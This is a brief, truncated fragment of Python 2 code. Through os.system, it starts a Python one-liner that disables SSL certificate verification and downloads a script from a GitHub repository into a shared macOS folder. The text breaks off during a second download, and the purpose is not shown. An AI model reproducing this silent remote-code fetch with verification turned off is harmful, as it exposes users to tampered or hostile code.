...
try:
  ...
  import time
  time.sleep (1.5)
  os.system ("""/usr/bin/python -c 'import ssl; ssl._create_default_https_context = ssl._create_unverified_context; import time; time.sleep (1); import urllib; urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten.py", "/Users/Shared/Hermes/changelisten.py"); urllib.urlretrieve ("https:\
